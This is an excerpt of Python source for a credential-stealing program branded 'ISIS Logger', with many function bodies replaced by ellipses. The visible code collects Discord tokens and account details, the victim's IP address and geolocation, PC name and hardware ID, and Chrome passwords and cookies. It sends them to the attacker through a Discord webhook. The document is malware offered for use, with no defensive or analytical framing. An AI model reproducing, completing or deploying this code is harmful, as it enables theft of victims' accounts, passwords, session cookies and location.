...
def main(webhook_url):
    ...
    embed = Embed(title="ISIS", color=1872341)
    ...
    embed.set_footer(text="ISIS Logger | Made by ISIS")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/964978186465206372/965287407912099860/61a.jpg")
    ...
    webhook.send(content="||@here|| <ISIS>", embed=embed, file=file, avatar_url="https://cdn.discordapp.com/attachments/964978186465206372/965287407912099860/61a.jpg", username="ISIS")
...
def accinfo():
    ...
    embed.add_field(name="Discord Informtation", value=f"Username: {username}\n\nPhone: {phone}\n\nEmail: {email}") 
...
def get_loc():
    ...
    try:
        ...
        embed.add_field(name="Public Info", value=f"IP: {ip}\n\nORG: {org}\n\nLocation: [{loc}]({googlemap})\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}") 
    except:
        pass
...
def get_more():
    ...
    pc_name = os.getenv("Computer")
    computer_os = platform()
    
    embed.add_field(name="PC INFO", value=f"OS: {computer_os}\n\nUser: {pc_username}\n\nPC Name: {pc_name}\n\nHWID: {gethwid()}\nCWD: {cwd}") 
...
class grabtokens():
    ...
    def grabTokens(self):
        ...
        embed.add_field(name="ᴅɪꜱᴄᴏʀᴅ ᴛᴏᴋᴇɴꜱ", value=f"```{self.tokens}```", inline=False) 
...
class password():
    ...
    def grabPassword(self):
        ...
        with open("google-passwords.txt", "w") as f:
            f.write("ISIS /// Google Chrome Passwords\n\n")
...
class cookiemonster:
    ...
    def grabCookies(self):
        ...
        with open(".\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            f.write("ISIS /// Google Chrome Cookies\n\n")
            try:
